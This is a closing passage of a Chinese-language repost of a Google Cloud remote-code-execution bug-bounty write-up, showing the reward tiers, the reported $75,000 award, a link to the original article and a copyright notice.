Cloud 管理员权限</span></section></td><td style="font-size: 0.75em;padding: 9px 12px;line-height: 22px;border: 1px solid rgb(239, 112, 96);vertical-align: top;"><section><span leaf="">$100,000</span></section></td></tr></tbody></table>  
实际落在哪一档，完全取决于被攻破的 prod 身份能直接访问多少生产环境范围。考虑到从生产环境访问到的庞大攻击面，从任何初始访问都极有可能实现权限提升。  
  
Google 的内部调查发现了比研究员展示的更多影响，最终这笔奖励落在了 $75,000 档次。  
  
  
原文链接：  
 https://brutecat.com/articles/google-cloud-rce/   
  
**版权声明**  
：本文由华盟网原创发布，保留所有权利。配图由华盟网授权使用。  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650617065&idx=1&sn=1e30ce488590711587c29414a82b7ab8&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650617222&idx=2&sn=a600c58c6ac251bf0313134ad70a4fd8&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650617751&idx=1&sn=f1c1ed68d848029fc1ff726087cac05a&scene=21#wechat_redirect)  
  
[](https://mp.weixin.qq.com/s?__biz=MzAxMjE3ODU3MQ==&mid=2650617464&idx=1&sn=a447b46bf211ae577eec30f82ed1d089&scene=21#wechat_redirect)  
> 👇 点击**阅读原文**  
，访问我的网站  
  
  
